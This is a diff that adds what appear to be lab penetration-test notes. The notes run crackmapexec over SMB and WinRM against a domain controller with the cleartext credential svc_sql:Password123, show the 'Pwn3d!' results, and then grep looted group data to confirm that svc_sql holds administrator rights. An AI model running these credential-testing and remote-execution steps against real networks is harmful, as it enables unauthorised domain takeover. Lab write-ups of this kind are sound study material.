@@ -1,0 +1,19 @@
+$ crackmapexec smb 172.16.202.131 -u svc_sql -p 'Password123'
+SMB   172.16.202.131  445  WIN-CFIU5AU7L2D  [*] Windows 10 / Server 2019 Build 17763 x64
+SMB   172.16.202.131  445  WIN-CFIU5AU7L2D  [+] corp.local\svc_sql:Password123 (Pwn3d!)
+
+$ crackmapexec winrm 172.16.202.131 -u svc_sql -p 'Password123'
+WINRM 172.16.202.131  5985 WIN-CFIU5AU7L2D  [+] corp.local\svc_sql:Password123 (Pwn3d!)
+
+$ grep -A9 '=== Administrators ===' loot/groups.txt
+=== Administrators ===
+DN: CN=Administrators,CN=Builtin,DC=corp,DC=local
+  - CN=Core-Infrastructure-Admins,OU=IT_Operations,OU=TitanCorp,DC=corp,DC=local
+  - CN=Tier1-Admins,OU=IT_Operations,OU=TitanCorp,DC=corp,DC=local
+  - CN=svc_sql,OU=Whoami-Labs,DC=corp,DC=local
+  - CN=Domain Admins,CN=Users,DC=corp,DC=local
+  - CN=Enterprise Admins,CN=Users,DC=corp,DC=local
+  - CN=Administrator,CN=Users,DC=corp,DC=local
+
+[+] svc_sql tiene acceso administrativo efectivo al DC.
+[+] WinRM habilitado en 5985: ejecución remota como svc_sql.
